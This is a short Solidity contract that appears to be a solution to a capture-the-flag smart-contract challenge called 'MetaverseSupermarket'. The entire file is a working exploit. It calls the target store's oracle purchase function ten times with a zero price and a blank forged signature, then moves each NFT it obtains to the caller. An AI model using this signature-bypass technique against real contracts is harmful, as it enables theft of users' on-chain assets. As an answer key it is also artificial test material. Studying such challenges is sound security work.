// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../MetaverseSupermarket.sol";
import "solmate/tokens/ERC721.sol";

contract MetaverseSupermarketAttacker {
    InflaStore public target;

    constructor(address _victimAddress) {
        target = InflaStore(_victimAddress);
    }

    function attack() external {
        for (uint256 i = 0; i < 10; i++) {
            target.buyUsingOracle(
                OraclePrice(block.number, 0),
                Signature(28, bytes32(0), bytes32(0))
            );

            target.meal().transferFrom(address(this), msg.sender, i);
        }
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external virtual returns (bytes4) {
        return ERC721TokenReceiver.onERC721Received.selector;
    }
}
